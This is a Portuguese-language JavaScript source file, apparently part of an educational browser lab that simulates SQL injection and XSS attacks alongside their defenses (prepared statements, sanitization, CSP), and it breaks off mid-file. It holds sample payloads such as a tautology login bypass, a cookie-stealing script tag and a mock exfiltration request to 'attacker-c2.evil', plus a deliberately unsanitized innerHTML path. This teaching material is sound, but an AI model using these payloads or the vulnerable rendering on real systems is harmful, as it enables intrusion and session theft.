/**
 * ==========================================================================
 * CYBERSEC LAB — CORE ENGINE
 * Laboratório Visual de Segurança da Informação, OWASP Top 10 & Criptografia
 * 100% Client-Side Vanilla JS ES6+ | Web Crypto API Nativa (crypto.subtle)
 * Zero Dependências Externas | Rigor de Engenharia de Software
 * Lead do Projeto: Sandro Junior Hoffmann de Oliveira (@sanjrhoff)
 * ==========================================================================
 */

(function () {
  'use strict';

  /* ==========================================================================
     1. SISTEMA CENTRAL DE AUDITORIA FORENSE (SIEM LOGGER) & TELEMETRIA
     ========================================================================== */
  class SIEMLogger {
    constructor() {
      this.logs = [];
      this.counts = {
        all: 0,
        EXPLOIT: 0,
        BLOCKED: 0,
        CRYPTO: 0,
        WARN: 0,
        INFO: 0
      };
      this.activeFilter = 'all';
      this.isExpanded = false;

      // Elementos do DOM
      this.hud = document.getElementById('siem-hud');
      this.viewport = document.getElementById('siem-log-viewport');
      this.ticker = document.getElementById('siem-ticker-preview');
      this.toggleBtn = document.getElementById('btn-siem-toggle');
      this.toggleIcon = document.getElementById('siem-toggle-icon');

      // Tickers Globais do Header
      this.statExploits = document.getElementById('stat-exploits');
      this.statBlocked = document.getElementById('stat-blocked');
      this.statCrypto = document.getElementById('stat-crypto');

      // Contadores da Barra
      this.countAll = document.getElementById('count-all');
      this.countExploit = document.getElementById('count-exploit');
      this.countBlocked = document.getElementById('count-blocked');
      this.countCrypto = document.getElementById('count-crypto');
      this.countWarn = document.getElementById('count-warn');

      this.initEvents();
    }

    initEvents() {
      // Toggle expandir / recolher
      if (this.toggleBtn) {
        this.toggleBtn.addEventListener('click', (e) => {
          e.stopPropagation();
          this.toggleExpand();
        });
      }

      const bar = document.getElementById('siem-bar');
      if (bar) {
        bar.addEventListener('click', (e) => {
          // Não toggle se clicou em botão interno
          if (e.target.closest('button')) return;
          this.toggleExpand();
        });
      }

      // Filtros
      const filterBtns = document.querySelectorAll('.siem-filter-btn');
      filterBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          filterBtns.forEach(b => b.classList.remove('is-active'));
          btn.classList.add('is-active');
          this.activeFilter = btn.getAttribute('data-filter') || 'all';
          this.render();
        });
      });

      // Botão Limpar
      const clearBtn = document.getElementById('btn-siem-clear');
      if (clearBtn) {
        clearBtn.addEventListener('click', (e) => {
          e.stopPropagation();
          this.clear();
        });
      }

      // Botão Copiar
      const copyBtn = document.getElementById('btn-siem-copy');
      if (copyBtn) {
        copyBtn.addEventListener('click', (e) => {
          e.stopPropagation();
          this.copyLogs();
        });
      }
    }

    toggleExpand(forceState) {
      if (typeof forceState === 'boolean') {
        this.isExpanded = forceState;
      } else {
        this.isExpanded = !this.isExpanded;
      }

      if (this.isExpanded) {
        this.hud.classList.remove('is-collapsed');
        this.hud.classList.add('is-expanded');
        if (this.toggleIcon) {
          this.toggleIcon.classList.remove('fa-chevron-up');
          this.toggleIcon.classList.add('fa-chevron-down');
        }
      } else {
        this.hud.classList.remove('is-expanded');
        this.hud.classList.add('is-collapsed');
        if (this.toggleIcon) {
          this.toggleIcon.classList.remove('fa-chevron-down');
          this.toggleIcon.classList.add('fa-chevron-up');
        }
      }
    }

    log(type, moduleTag, message, details = null) {
      const now = new Date();
      const isoTime = now.toISOString();

      const entry = {
        id: 'SEC-' + Math.random().toString(36).substr(2, 9).toUpperCase(),
        timestamp: isoTime,
        type: type, // 'EXPLOIT', 'BLOCKED', 'CRYPTO', 'WARN', 'INFO'
        module: moduleTag,
        message: message,
        details: details
      };

      this.logs.unshift(entry); // Mais recente no início
      if (this.logs.length > 300) this.logs.pop(); // Limite em memória

      // Atualiza contagens
      this.counts.all++;
      if (this.counts[type] !== undefined) {
        this.counts[type]++;
      }

      // Atualiza DOM
      this.updateCounters();
      this.render();

      // Atualiza Ticker
      if (this.ticker) {
        this.ticker.textContent = `[${type}] ${moduleTag}: ${message}`;
      }
    }

    updateCounters() {
      if (this.statExploits) this.statExploits.textContent = this.counts.EXPLOIT;
      if (this.statBlocked) this.statBlocked.textContent = this.counts.BLOCKED;
      if (this.statCrypto) this.statCrypto.textContent = this.counts.CRYPTO;

      if (this.countAll) this.countAll.textContent = this.counts.all;
      if (this.countExploit) this.countExploit.textContent = this.counts.EXPLOIT;
      if (this.countBlocked) this.countBlocked.textContent = this.counts.BLOCKED;
      if (this.countCrypto) this.countCrypto.textContent = this.counts.CRYPTO;
      if (this.countWarn) this.countWarn.textContent = this.counts.WARN;
    }

    render() {
      if (!this.viewport) return;

      const filtered = this.activeFilter === 'all'
        ? this.logs
        : this.logs.filter(l => l.type === this.activeFilter);

      if (filtered.length === 0) {
        this.viewport.innerHTML = `
          <div style="padding: 1rem; color: var(--text-muted); text-align: center;">
            Nenhum evento registrado para o filtro selecionado (${this.activeFilter}).
          </div>
        `;
        return;
      }

      this.viewport.innerHTML = filtered.map(log => {
        let badgeClass = 'siem-badge--info';
        if (log.type === 'EXPLOIT') badgeClass = 'siem-badge--exploit';
        if (log.type === 'BLOCKED') badgeClass = 'siem-badge--blocked';
        if (log.type === 'CRYPTO') badgeClass = 'siem-badge--crypto';
        if (log.type === 'WARN') badgeClass = 'siem-badge--warn';

        return `
          <div class="siem-log-row">
            <span class="siem-time">${log.timestamp.slice(11, 23)}</span>
            <span class="siem-badge ${badgeClass}">[${log.type}]</span>
            <span class="siem-module-tag">[${log.module}]</span>
            <span class="siem-msg">${this.escapeHtml(log.message)}</span>
          </div>
        `;
      }).join('');
    }

    clear() {
      this.logs = [];
      this.counts = { all: 0, EXPLOIT: 0, BLOCKED: 0, CRYPTO: 0, WARN: 0, INFO: 0 };
      this.updateCounters();
      this.render();
      if (this.ticker) this.ticker.textContent = 'Histórico do console limpo pelo operador.';
      this.log('INFO', 'SIEM', 'Histórico de eventos forenses reinicializado.');
    }

    copyLogs() {
      if (this.logs.length === 0) return;
      const text = this.logs.map(l => `[${l.timestamp}] [${l.type}] [${l.module}] ${l.message}`).join('\n');
      navigator.clipboard.writeText(text).then(() => {
        const copyBtn = document.getElementById('btn-siem-copy');
        if (copyBtn) {
          const original = copyBtn.innerHTML;
          copyBtn.innerHTML = '<i class="fas fa-check text-emerald"></i> Copiado!';
          setTimeout(() => { copyBtn.innerHTML = original; }, 1800);
        }
      });
    }

    escapeHtml(str) {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    }
  }

  // Instância singleton do Logger
  const logger = new SIEMLogger();

  /* ==========================================================================
     2. GERENCIADOR DE ABAS & ATALHOS DE TECLADO (TAB MANAGER)
     ========================================================================== */
  class TabManager {
    constructor() {
      this.tabs = ['sqli', 'xss', 'tls', 'jwt', 'hash'];
      this.activeTab = 'sqli';
      this.initEvents();
    }

    initEvents() {
      const tabBtns = document.querySelectorAll('.cyber-tab-btn');
      tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
          const tabId = btn.getAttribute('data-tab');
          this.switchTab(tabId);
        });
      });

      // Atalhos Globais de Teclado
      document.addEventListener('keydown', (e) => {
        // Se estiver focado em input/textarea, não interferir com digitação comum
        const isEditing = ['INPUT', 'TEXTAREA', 'SELECT'].includes(document.activeElement.tagName);

        if (e.altKey && e.key >= '1' && e.key <= '5') {
          e.preventDefault();
          const idx = parseInt(e.key, 10) - 1;
          this.switchTab(this.tabs[idx]);
        } else if (!isEditing && e.key >= '1' && e.key <= '5') {
          const idx = parseInt(e.key, 10) - 1;
          this.switchTab(this.tabs[idx]);
        } else if (e.altKey && (e.key === 'l' || e.key === 'L')) {
          e.preventDefault();
          logger.toggleExpand();
        } else if (e.altKey && (e.key === 'g' || e.key === 'G')) {
          e.preventDefault();
          toggleGuideModal();
        } else if (e.altKey && (e.key === 'r' || e.key === 'R')) {
          e.preventDefault();
          resetCurrentModule();
        } else if (e.altKey && (e.key === 'e' || e.key === 'E')) {
          e.preventDefault();
          openAuditModal();
        } else if (e.key === 'Escape') {
          closeAuditModal();
          closeGuideModal();
        }
      });
    }

    switchTab(tabId) {
      if (!this.tabs.includes(tabId)) return;
      this.activeTab = tabId;

      // Atualiza botões de navegação
      document.querySelectorAll('.cyber-tab-btn').forEach(btn => {
        const isTarget = btn.getAttribute('data-tab') === tabId;
        btn.classList.toggle('is-active', isTarget);
        btn.setAttribute('aria-selected', isTarget ? 'true' : 'false');
      });

      // Atualiza painéis de conteúdo
      document.querySelectorAll('.module-panel').forEach(panel => {
        const isTarget = panel.id === `panel-${tabId}`;
        panel.classList.toggle('is-active', isTarget);
      });

      logger.log('INFO', 'NAV', `Navegação para Módulo [${tabId.toUpperCase()}].`);
    }
  }

  const tabManager = new TabManager();

  /* ==========================================================================
     3. MÓDULO 1: SQL INJECTION (SQLi) PLAYGROUND & AST PARSER
     ========================================================================== */
  class SQLiModule {
    constructor() {
      this.isVulnerable = true; // true = Concatenação, false = Prepared Statement
      this.usersTable = [
        { id: 1, username: 'admin', role: 'superadmin', email: 'admin@soc.corp', salary: '$14,500', password_hash: '$2b$12$K8yGEy4.rG.7/9NfBqH...', pass_plain: 'admin2026' },
        { id: 2, username: 'sandro', role: 'security_analyst', email: 'sandro@soc.corp', salary: '$11,200', password_hash: '$2b$12$mP7q09b.xG.3/2ZfLqA...', pass_plain: 'sandrosec99' },
        { id: 3, username: 'mariana', role: 'finance_director', email: 'mariana@soc.corp', salary: '$13,800', password_hash: '$2b$12$9vLk21n.yT.8/5KjWqB...', pass_plain: 'marianafin2026' },
        { id: 4, username: 'roberto', role: 'lead_developer', email: 'roberto@soc.corp', salary: '$9,400', password_hash: '$2b$12$xR2e55p.zW.1/4QmPpC...', pass_plain: 'devroberto44' },
        { id: 5, username: 'lucas', role: 'devops_engineer', email: 'lucas@soc.corp', salary: '$9,800', password_hash: '$2b$12$wQ4n88m.kE.9/7VxRrD...', pass_plain: 'dockerkube1' }
      ];

      // Elementos do DOM
      this.btnVuln = document.getElementById('btn-sqli-vuln');
      this.btnSecure = document.getElementById('btn-sqli-secure');
      this.userInput = document.getElementById('sqli-username');
      this.passInput = document.getElementById('sqli-password');
      this.queryDisplay = document.getElementById('sqli-query-display');
      this.queryType = document.getElementById('sqli-query-type');
      this.astViewport = document.getElementById('ast-viewport');
      this.astStatus = document.getElementById('ast-status-badge');
      this.dbTbody = document.getElementById('sqli-db-tbody');
      this.dbBanner = document.getElementById('db-status-banner');
      this.dbStatusText = document.getElementById('db-status-text');
      this.dbRowsCount = document.getElementById('db-rows-count');
      this.btnExecute = document.getElementById('btn-sqli-execute');
      this.btnClear = document.getElementById('btn-sqli-clear');

      this.initEvents();
      this.updateDisplayAndAST();
      this.executeSimulation();
    }

    initEvents() {
      if (this.btnVuln) {
        this.btnVuln.addEventListener('click', () => {
          this.setMode(true);
        });
      }
      if (this.btnSecure) {
        this.btnSecure.addEventListener('click', () => {
          this.setMode(false);
        });
      }

      if (this.userInput) {
        this.userInput.addEventListener('input', () => {
          this.updateDisplayAndAST();
        });
      }
      if (this.passInput) {
        this.passInput.addEventListener('input', () => {
          this.updateDisplayAndAST();
        });
      }

      if (this.btnExecute) {
        this.btnExecute.addEventListener('click', () => {
          this.executeSimulation();
        });
      }

      if (this.btnClear) {
        this.btnClear.addEventListener('click', () => {
          this.userInput.value = '';
          this.passInput.value = '';
          this.updateDisplayAndAST();
          this.executeSimulation();
        });
      }

      // Presets
      const presetChips = document.querySelectorAll('#sqli-presets .preset-chip');
      presetChips.forEach(chip => {
        chip.addEventListener('click', () => {
          presetChips.forEach(c => c.classList.remove('active'));
          chip.classList.add('active');
          this.userInput.value = chip.getAttribute('data-user') || '';
          this.passInput.value = chip.getAttribute('data-pass') || '';
          this.updateDisplayAndAST();
          this.executeSimulation();
        });
      });
    }

    setMode(vulnerable) {
      this.isVulnerable = vulnerable;
      if (this.btnVuln && this.btnSecure) {
        if (vulnerable) {
          this.btnVuln.classList.add('active-vuln');
          this.btnSecure.classList.remove('active-secure');
          this.queryType.textContent = '[UNSANITIZED INTERPOLATION]';
          this.queryType.className = 'text-crimson font-mono';
        } else {
          this.btnVuln.classList.remove('active-vuln');
          this.btnSecure.classList.add('active-secure');
          this.queryType.textContent = '[PREPARED STATEMENT (PARAMETERIZED)]';
          this.queryType.className = 'text-emerald font-mono';
        }
      }
      this.updateDisplayAndAST();
      this.executeSimulation();
      logger.log('INFO', 'M1: SQLi', `Modo alterado para: ${vulnerable ? 'Vulnerável (Concat)' : 'Seguro (Prepared Statement)'}`);
    }

    updateDisplayAndAST() {
      const user = this.userInput ? this.userInput.value : '';
      const pass = this.passInput ? this.passInput.value : '';

      // Highlighting do SQL
      if (this.isVulnerable) {
        this.queryDisplay.innerHTML = `
          <span class="sql-kw">SELECT</span> * <span class="sql-kw">FROM</span> users <span class="sql-kw">WHERE</span> username = '<span class="sql-injected">${this.escapeHtml(user)}</span>' <span class="sql-kw">AND</span> password = '<span class="sql-str">${this.escapeHtml(pass)}</span>';
        `;
      } else {
        this.queryDisplay.innerHTML = `
          <span class="sql-kw">PREPARE</span> stmt <span class="sql-kw">FROM</span> <span class="sql-str">'SELECT * FROM users WHERE username = ? AND password = ?'</span>;<br>
          <span class="sql-kw">EXECUTE</span> stmt <span class="sql-kw">USING</span> <span class="sql-str">'${this.escapeHtml(user)}'</span>, <span class="sql-str">'${this.escapeHtml(pass)}'</span>;
        `;
      }

      this.renderAST(user, pass);
    }

    renderAST(user, pass) {
      if (!this.astViewport) return;

      const hasQuoteEscape = user.includes("'");
      const hasTautology = (/'\s*OR\s*('1'='1'|1=1|TRUE)/i.test(user)) || (/\bOR\s+1=1\b/i.test(user));
      const hasComment = user.includes('--') || user.includes('#') || user.includes('/*');
      const hasUnion = /UNION\s+SELECT/i.test(user);

      if (this.isVulnerable && (hasTautology || hasComment || hasUnion || hasQuoteEscape)) {
        this.astStatus.className = 'badge-danger font-mono';
        this.astStatus.textContent = 'GRAMÁTICA SUBVERTIDA (HIJACK)';

        let whereHtml = '';
        if (hasTautology) {
          whereHtml = `
            <div class="ast-level">
              <div class="ast-node ast-node--exploit">
                <i class="fas fa-triangle-exclamation"></i>
                <span>OPERATOR [OR]: TAUTOLOGIA SEMPRE VERDADEIRA ('1'='1' ➔ TRUE)</span>
              </div>
            </div>
          `;
        }

        if (hasComment) {
          whereHtml += `
            <div class="ast-edge-down"></div>
            <div class="ast-level">
              <div class="ast-node ast-node--comment">
                <i class="fas fa-scissors text-amber"></i>
                <span>[TRUNCADO POR COMENTÁRIO]: AND password = '${this.escapeHtml(pass)}' (IGNORADO)</span>
              </div>
            </div>
          `;
        }

        if (hasUnion) {
          whereHtml += `
            <div class="ast-edge-down"></div>
            <div class="ast-level">
              <div class="ast-node ast-node--exploit">
                <i class="fas fa-database text-violet"></i>
                <span>[UNION EXFILTRATION]: Adiciona tabela arbitrária ao conjunto resultante</span>
              </div>
            </div>
          `;
        }

        this.astViewport.innerHTML = `
          <div class="ast-tree">
            <div class="ast-level">
              <div class="ast-node ast-node--root">
                <i class="fas fa-database"></i> [STATEMENT ROOT: SELECT * FROM users]
              </div>
            </div>
            <div class="ast-edge-down"></div>
            <div class="ast-level">
              <div class="ast-node ast-node--exploit">
                <i class="fas fa-code-fork text-crimson"></i> [WHERE CLAUSE INJETADA: LÓGICA BOOLEANA DETURPADA]
              </div>
            </div>
            <div class="ast-edge-down"></div>
            ${whereHtml}
          </div>
        `;
      } else if (!this.isVulnerable) {
        this.astStatus.className = 'badge-secure font-mono';
        this.astStatus.textContent = 'ÁRVORE PROTEGIDA (BOUND)';

        this.astViewport.innerHTML = `
          <div class="ast-tree">
            <div class="ast-level">
              <div class="ast-node ast-node--root">
                <i class="fas fa-shield-halved text-emerald"></i> [STATEMENT ROOT: SELECT * FROM users]
              </div>
            </div>
            <div class="ast-edge-down"></div>
            <div class="ast-level">
              <div class="ast-node ast-node--secure">
                <i class="fas fa-link text-emerald"></i> [WHERE CLAUSE: username = ? AND password = ?]
              </div>
            </div>
            <div class="ast-edge-down"></div>
            <div class="ast-level">
              <div class="ast-node">
                <i class="fas fa-cube text-cyan"></i> PARAM 1: LITERAL STRING ("${this.escapeHtml(user)}")
              </div>
              <div class="ast-node">
                <i class="fas fa-cube text-cyan"></i> PARAM 2: LITERAL STRING ("${this.escapeHtml(pass)}")
              </div>
            </div>
          </div>
        `;
      } else {
        this.astStatus.className = 'badge-cyan font-mono';
        this.astStatus.textContent = 'CONSULTA REGULAR';

        this.astViewport.innerHTML = `
          <div class="ast-tree">
            <div class="ast-level">
              <div class="ast-node ast-node--root">
                <i class="fas fa-database"></i> [STATEMENT ROOT: SELECT * FROM users]
              </div>
            </div>
            <div class="ast-edge-down"></div>
            <div class="ast-level">
              <div class="ast-node">
                <i class="fas fa-code-fork"></i> [WHERE: (username = '${this.escapeHtml(user)}') AND (password = '${this.escapeHtml(pass)}')]
              </div>
            </div>
          </div>
        `;
      }
    }

    executeSimulation() {
      const user = (this.userInput ? this.userInput.value : '').trim();
      const pass = (this.passInput ? this.passInput.value : '').trim();

      let matchedRows = [];
      let isBreached = false;

      if (this.isVulnerable) {
        const hasTautology = (/'\s*OR\s*('1'='1'|1=1|TRUE)/i.test(user)) || (/\bOR\s+1=1\b/i.test(user));
        const hasComment = user.includes('--') || user.includes('#') || user.includes('/*');
        const hasUnion = /UNION\s+SELECT/i.test(user);

        if (hasTautology) {
          // Retorna todos os usuários
          matchedRows = [...this.usersTable];
          isBreached = true;
          logger.log('EXPLOIT', 'M1: SQLi', `Injeção SQL bem-sucedida! Tautologia '${user}' burlou a checagem de senha e expôs ${matchedRows.length} contas.`);
        } else if (user.startsWith("admin'") && hasComment) {
          // Bypass específico de admin
          matchedRows = [this.usersTable[0]];
          isBreached = true;
          logger.log('EXPLOIT', 'M1: SQLi', `Injeção SQL Admin Bypass executada com sucesso! Login autenticado como 'admin' sem senha.`);
        } else if (hasUnion) {
          // Union exfiltration
          matchedRows = [
            ...this.usersTable,
            { id: 99, username: 'exfil_c2', role: 'admin_infiltrator', email: 'c2@dark.net', salary: '$99,999', password_hash: '$2b$12$exfiltrated_hash', pass_plain: 'pwned' }
          ];
          isBreached = true;
          logger.log('EXPLOIT', 'M1: SQLi', `Union-Based Data Exfiltration detectada. Dados sintéticos anexados à resposta.`);
        } else {
          // Checagem normal em modo vulnerável
          const found = this.usersTable.find(u => u.username === user && u.pass_plain === pass);
          if (found) {
            matchedRows = [found];
            logger.log('INFO', 'M1: SQLi', `Autenticação legítima bem-sucedida para o usuário '${user}'.`);
          } else {
            matchedRows = [];
            logger.log('WARN', 'M1: SQLi', `Tentativa de login sem sucesso para '${user}'. 0 registros retornados.`);
          }
        }
      } else {
        // Modo Seguro (Prepared Statement): payload é estritamente valor literal
        const found = this.usersTable.find(u => u.username === user && u.pass_plain === pass);
        if (found) {
          matchedRows = [found];
          logger.log('INFO', 'M1: SQLi', `Prepared Statement autenticou credencial válida para '${user}'.`);
        } else {
          matchedRows = [];
          if (user.includes("'") || user.includes("--") || user.includes("OR")) {
            logger.log('BLOCKED', 'M1: SQLi', `Prepared Statement bloqueou injeção SQL! Metacaracteres tratados como literal. 0 registros retornados.`);
          } else {
            logger.log('INFO', 'M1: SQLi', `Prepared statement executado. Credenciais inexistentes.`);
          }
        }
      }

      this.renderTable(matchedRows, isBreached);
    }

    renderTable(rows, isBreached) {
      if (!this.dbTbody) return;

      if (isBreached) {
        this.dbBanner.className = 'db-status-banner db-status--breached';
        this.dbStatusText.innerHTML = '<i class="fas fa-radiation"></i> AUTENTICAÇÃO VIOLADA: VAZAMENTO DE REGISTROS CORPORATIVOS!';
      } else if (rows.length > 0) {
        this.dbBanner.className = 'db-status-banner db-status--safe';
        this.dbStatusText.innerHTML = '<i class="fas fa-shield-check"></i> AUTENTICAÇÃO LEGÍTIMA CONFIRMADA (SESSÃO SEGURA)';
      } else {
        this.dbBanner.className = 'db-status-banner db-status--empty';
        this.dbStatusText.innerHTML = '<i class="fas fa-lock"></i> NENHUM REGISTRO RETORNADO (ACESSO NEGADO)';
      }

      this.dbRowsCount.textContent = `ROWS: ${rows.length}`;

      if (rows.length === 0) {
        this.dbTbody.innerHTML = `
          <tr>
            <td colspan="6" style="text-align: center; color: var(--text-muted); padding: 1.25rem;">
              0 rows returned. (Driver do banco não localizou tuplas correspondentes aos parâmetros informados).
            </td>
          </tr>
        `;
        return;
      }

      this.dbTbody.innerHTML = rows.map(r => `
        <tr class="${isBreached ? 'row-breached' : ''}">
          <td><strong>${r.id}</strong></td>
          <td><span class="font-mono ${r.role.includes('admin') ? 'text-crimson' : 'text-pure'}">${r.username}</span></td>
          <td><span class="badge-cyan font-mono">${r.role}</span></td>
          <td>${r.email}</td>
          <td class="font-mono text-emerald">${r.salary}</td>
          <td class="font-mono text-muted" title="${r.password_hash}">${r.password_hash.slice(0, 16)}...</td>
        </tr>
      `).join('');
    }

    reset() {
      if (this.userInput) this.userInput.value = "' OR '1'='1' --";
      if (this.passInput) this.passInput.value = 'qualquer';
      this.setMode(true);
    }

    escapeHtml(str) {
      if (!str) return '';
      return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }
  }

  const sqliModule = new SQLiModule();

  /* ==========================================================================
     4. MÓDULO 2: XSS (CROSS-SITE SCRIPTING) & DEFESA COM CSP
     ========================================================================== */
  class XSSModule {
    constructor() {
      this.attackType = 'reflected'; // 'reflected', 'stored', 'dom'
      this.isSanitizing = false;
      this.isCSPActive = false;

      this.comments = [
        { author: 'Mariana Silva (Financeiro)', time: '10:42', content: 'Relatório orçamentário do Q4 disponibilizado para auditoria interna.' },
        { author: 'Roberto Santos (Dev Lead)', time: '11:15', content: 'Atualização de dependências concluída sem regressões no gateway.' }
      ];

      // Elementos do DOM
      this.input = document.getElementById('xss-input');
      this.inputLabel = document.getElementById('xss-input-label');
      this.toggleSanitize = document.getElementById('toggle-xss-sanitize');
      this.toggleCSP = document.getElementById('toggle-xss-csp');
      this.btnExecute = document.getElementById('btn-xss-execute');
      this.btnReset = document.getElementById('btn-xss-reset');
      this.rawPreview = document.getElementById('xss-raw-preview');
      this.encodedPreview = document.getElementById('xss-encoded-preview');
      this.intranetFeed = document.getElementById('intranet-feed');
      this.exfilToast = document.getElementById('exfil-c2-toast');
      this.exfilBody = document.getElementById('exfil-c2-body');
      this.cspConsole = document.getElementById('csp-violations-list');

      this.initEvents();
      this.updateFeed();
      this.updatePreviews();
    }

    initEvents() {
      // Alternância de tipos de XSS
      const typeBtns = document.querySelectorAll('.xss-type-btn');
      typeBtns.forEach(btn => {
        btn.addEventListener('click', () => {
          typeBtns.forEach(b => b.classList.remove('is-active'));
          btn.classList.add('is-active');
          this.attackType = btn.getAttribute('data-type') || 'reflected';
          if (this.attackType === 'reflected') {
            this.inputLabel.textContent = 'Parâmetro de Busca Refletido (Search Query):';
          } else if (this.attackType === 'stored') {
            this.inputLabel.textContent = 'Comentário Persistente para o Mural Corporativo:';
          } else {
            this.inputLabel.textContent = 'Fragmento DOM de URL (location.hash / innerHTML):';
          }
          logger.log('INFO', 'M2: XSS', `Vetor selecionado: ${this.attackType.toUpperCase()} XSS.`);
        });
      });

      // Toggles de Defesa
      if (this.toggleSanitize) {
        this.toggleSanitize.addEventListener('click', () => {
          this.isSanitizing = !this.isSanitizing;
          this.toggleSanitize.classList.toggle('is-active', this.isSanitizing);
          this.updatePreviews();
          logger.log(
            this.isSanitizing ? 'BLOCKED' : 'WARN',
            'M2: XSS',
            `Sanitização Contextual de HTML ${this.isSanitizing ? 'HABILITADA' : 'DESABILITADA'}.`
          );
        });
      }

      if (this.toggleCSP) {
        this.toggleCSP.addEventListener('click', () => {
          this.isCSPActive = !this.isCSPActive;
          this.toggleCSP.classList.toggle('is-active', this.isCSPActive);
          logger.log(
            this.isCSPActive ? 'BLOCKED' : 'WARN',
            'M2: XSS',
            `Política CSP restritiva ${this.isCSPActive ? 'ATIVADA' : 'DESATIVADA'} (default-src 'self'; script-src 'self').`
          );
        });
      }

      // Presets
      const presets = document.querySelectorAll('#xss-presets .preset-chip');
      presets.forEach(p => {
        p.addEventListener('click', () => {
          presets.forEach(c => c.classList.remove('active'));
          p.classList.add('active');
          this.input.value = p.getAttribute('data-payload') || '';
          this.updatePreviews();
        });
      });

      if (this.input) {
        this.input.addEventListener('input', () => {
          this.updatePreviews();
        });
      }

      if (this.btnExecute) {
        this.btnExecute.addEventListener('click', () => {
          this.submitPayload();
        });
      }

      if (this.btnReset) {
        this.btnReset.addEventListener('click', () => {
          this.reset();
        });
      }
    }

    updatePreviews() {
      const raw = this.input ? this.input.value : '';
      if (this.rawPreview) this.rawPreview.textContent = raw || '(vazio)';
      if (this.encodedPreview) {
        this.encodedPreview.textContent = this.isSanitizing
          ? this.sanitizeHtml(raw)
          : raw;
      }
    }

    sanitizeHtml(str) {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
    }

    submitPayload() {
      const raw = (this.input ? this.input.value : '').trim();
      if (!raw) return;

      const containsScriptTags = /<\s*(script|img|svg|iframe|a)\b/i.test(raw);
      const containsEventHandler = /\b(onerror|onload|onclick|href\s*=\s*['"]?javascript:)/i.test(raw);
      const isMalicious = containsScriptTags || containsEventHandler;

      // CENÁRIO 1: Bloqueio por CSP
      if (this.isCSPActive && isMalicious) {
        const violationMsg = `[CSP VIOLATION] Refused to execute inline script or event handler because it violates Content Security Policy directive: "script-src 'self'". Blocked URI: inline.`;
        if (this.cspConsole) {
          this.cspConsole.innerHTML = `
            <div class="csp-violation-line text-amber">
              <i class="fas fa-ban"></i> ${violationMsg}
            </div>
          `;
        }
        if (this.exfilToast) this.exfilToast.classList.remove('is-visible');
        logger.log('BLOCKED', 'M2: XSS', `Cabeçalho CSP bloqueou execução de script inline: ${raw.slice(0, 45)}...`);
        return;
      }

      // CENÁRIO 2: Sanitização Ativa (Neutraliza o exploit)
      if (this.isSanitizing) {
        const safeText = this.sanitizeHtml(raw);
        this.addPost('Atacante (Testador Forense)', safeText, false);
        if (this.exfilToast) this.exfilToast.classList.remove('is-visible');
        logger.log('BLOCKED', 'M2: XSS', `Sanitização contextual neutralizou tags maliciosas. Renderizado como texto puro.`);
        return;
      }

      // CENÁRIO 3: Vulnerável (Exploit executado no contexto da vítima)
      if (isMalicious) {
        this.addPost('Atacante Malicioso (Infiltrado)', raw, true);
        this.triggerC2Exfiltration(raw);
        logger.log('EXPLOIT', 'M2: XSS', `XSS (${this.attackType.toUpperCase()}) executado com sucesso! Dados da sessão da vítima vazados para servidor C2.`);
      } else {
        this.addPost('Colaborador', raw, false);
        logger.log('INFO', 'M2: XSS', `Mensagem benigna postada sem incidentes.`);
      }
    }

    addPost(author, text, isHostile) {
      if (this.attackType === 'reflected') {
        // Exibe apenas a busca refletida
        this.intranetFeed.innerHTML = `
          <div class="intranet-post" style="${isHostile ? 'border-color: var(--sec-crimson); background: rgba(239, 68, 68, 0.05);' : ''}">
            <div class="intranet-post-meta">
              <span class="font-mono text-cyan"><i class="fas fa-search"></i> Resultados para a busca:</span>
              <span>Agora</span>
            </div>
            <div class="intranet-post-content ${isHostile ? 'text-crimson' : ''}">
              ${this.isSanitizing ? this.sanitizeHtml(text) : text}
            </div>
          </div>
        `;
      } else {
        // Stored: Adiciona ao mural
        const now = new Date();
        const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
        this.comments.unshift({
          author: author,
          time: timeStr,
          content: this.isSanitizing ? this.sanitizeHtml(text) : text,
          isHostile: isHostile
        });
        this.updateFeed();
      }
    }

    updateFeed() {
      if (!this.intranetFeed) return;
      this.intranetFeed.innerHTML = this.comments.map(c => `
        <div class="intranet-post" style="${c.isHostile ? 'border-color: var(--sec-crimson); background: rgba(239, 68, 68, 0.06);' : ''}">
          <div class="intranet-post-meta">
            <strong class="${c.isHostile ? 'text-crimson' : 'text-pure'}">${c.author}</strong>
            <span>${c.time}</span>
          </div>
          <div class="intranet-post-content ${c.isHostile ? 'text-crimson' : ''}">${c.content}</div>
        </div>
      `).join('');
    }

    triggerC2Exfiltration(payload) {
      if (!this.exfilToast || !this.exfilBody) return;

      const stolenCookie = 'session_auth=SANDRO_SEC_AUTH_9981aef; role=finance';
      const stolenJwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';

      this.exfilBody.innerHTML = `
        GET https://attacker-c2.evil/drop?cookie=${encodeURIComponent(stolenCookie)}&jwt=${encodeURIComponent(stolenJwt)}<br>
        <span class="text-secondary">[VÍTIMA]: Mariana Silva (Diretora Financeira)</span>
      `;
      this.exfilToast.classList.add('is-visible');
    }

    reset() {
      this.comments = [
        { author: 'Mariana Silva (Financeiro)', time: '10:42', content: 'Relatório orçamentário do Q4 disponibilizado para auditoria interna.' },
        { author: 'Roberto Santos (Dev Lead)', time: '11:15', content: 'Atualização de dependências concluída sem regressões no gateway.' }
      ];
      this.updateFeed();
      if (this.exfilToast) this.exfilToast.classList.remove('is-visible');
      if (this.cspConsole) this.cspConsole.textContent = 'Nenhuma violação de CSP registrada no momento.';
      if (this.input) this.input.value = '<script>stealSession(document.cookie)</script>';
      this.isSanitizing = false;
      this.isCSPActive = false;
      if (this.toggleSanitize) this.toggleSanitize.classList.remove('is-active');
      if (this.toggleCSP) this.toggleCSP.classList.remove('is-active');
      this.updatePreviews();
      logger.log('INFO', 'M2: XSS', 'Mural de sandbox e parâmetros de XSS restaurados.');
    }
  }

  const xssModule = new XSSModule();

  /* ==========================================================================
